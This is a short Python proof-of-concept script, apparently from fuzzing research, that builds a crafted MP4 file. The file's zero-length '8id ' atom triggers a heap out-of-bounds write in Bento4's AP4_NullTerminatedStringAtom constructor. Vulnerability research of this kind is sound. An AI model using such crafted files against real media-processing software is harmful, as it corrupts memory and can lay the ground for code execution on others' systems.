#!/usr/bin/env python3
"""
PoC generator for: Heap OOB Write in AP4_NullTerminatedStringAtom
When Atom Size == Header Size (size == 8), str_size = 0,
then str[str_size-1] = str[0xFFFFFFFF] triggers OOB write.
"""
import struct
import os

output_dir = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Atom_cpp"
output_file = os.path.join(output_dir, "vuln_001.mp4")

os.makedirs(output_dir, exist_ok=True)

def box(type_str, payload=b""):
    """Build a box: 4-byte BE size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("latin-1") + payload

# ftyp box: size(4B BE) + "ftyp" + "mp42"(4B) + version(4B 0) + compatible "mp42"(4B)
ftyp_payload = b"mp42" + struct.pack(">I", 0) + b"mp42"
ftyp = box("ftyp", ftyp_payload)  # 20 bytes total

# Malicious 8id  atom: size=8, type="8id " (AP4_ATOM_TYPE_8ID_ = AP4_ATOM_TYPE('8','i','d',' ')), no payload
# The constant is NAMED 8ID_ but its VALUE uses lowercase 'i','d' and a space (0x20), not underscore.
# This triggers AP4_NullTerminatedStringAtom constructor with size == AP4_ATOM_HEADER_SIZE (8).
# str_size = 8 - 8 = 0; str[0-1] = str[0xFFFFFFFF] => OOB write
malicious_atom = struct.pack(">I", 8) + b"8id "  # 8 bytes, no data (space = 0x20)

# moov box containing the malicious atom
moov = box("moov", malicious_atom)  # 8 (moov header) + 8 (8ID_ atom) = 16 bytes

# Combine into final MP4
data = ftyp + moov

with open(output_file, "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to {output_file}")
print(f"  ftyp: {len(ftyp)} bytes")
print(f"  moov: {len(moov)} bytes (contains 8-byte 8ID_ atom with size==header_size)")
